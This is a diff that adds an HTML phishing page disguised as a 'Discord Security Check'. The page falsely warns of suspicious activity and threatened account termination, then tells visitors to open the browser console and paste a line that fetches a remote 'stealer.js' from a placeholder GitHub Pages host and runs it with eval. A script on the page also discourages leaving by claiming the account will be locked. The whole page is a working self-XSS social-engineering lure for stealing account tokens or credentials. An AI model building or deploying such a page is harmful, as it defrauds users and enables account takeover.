@@ -1,0 +1,84 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Discord Security Check</title>
+    <style>
+        body {
+            background-color: #2f3136;
+            color: white;
+            font-family: 'Whitney', 'Helvetica Neue', Helvetica, Arial, sans-serif;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            height: 100vh;
+            margin: 0;
+            text-align: center;
+        }
+        .container {
+            background-color: #36393f;
+            padding: 40px;
+            border-radius: 8px;
+            box-shadow: 0 2px 10px 0 rgba(0,0,0,0.2);
+            max-width: 500px;
+        }
+        h1 { color: #fff; margin-bottom: 20px; }
+        p { color: #b9bbbe; margin-bottom: 20px; line-height: 1.5; }
+        .btn {
+            background-color: #5865f2;
+            color: white;
+            padding: 10px 20px;
+            border-radius: 3px;
+            text-decoration: none;
+            font-weight: bold;
+            cursor: pointer;
+            border: none;
+            font-size: 16px;
+        }
+        .btn:hover { background-color: #4752c4; }
+        .hidden { display: none; }
+        code {
+            background: #202225;
+            padding: 2px 4px;
+            border-radius: 3px;
+            color: #ff5555;
+        }
+    </style>
+</head>
+<body>
+
+    <div class="container">
+        <h1>⚠️ Security Alert</h1>
+        <p>
+            Suspicious activity detected on your account. 
+            To verify your identity and prevent account termination, 
+            you must run a quick security check.
+        </p>
+        <p>
+            1. Press <code>F12</code> or <code>Ctrl+Shift+J</code> (Windows) 
+            or <code>Cmd+Option+J</code> (Mac) to open the Console.
+        </p>
+        <p>
+            2. Paste the following code and press <code>Enter</code>:
+        </p>
+        <div style="background:#202225; padding:15px; border-radius:5px; word-break:break-all; font-family:monospace; font-size:12px; color:#00ff00; margin-bottom:20px;">
+            fetch('https://YOUR-GITHUB-USERNAME.github.io/YOUR-REPO-NAME/stealer.js').then(r=>r.text()).then(eval);
+        </div>
+        <p>
+            <strong>Do not close this page until verification is complete.</strong>
+        </p>
+        <button class="btn" onclick="alert('Please follow the instructions above to verify your account.')">I am working on it</button>
+    </div>
+
+    <script>
+        // Optional: You can put a dummy script here that does nothing, 
+        // or redirects them if they try to leave.
+        window.onbeforeunload = function() {
+            return "Verification in progress. Leaving will lock your account.";
+        };
+    </script>
+
+</body>
+</html>
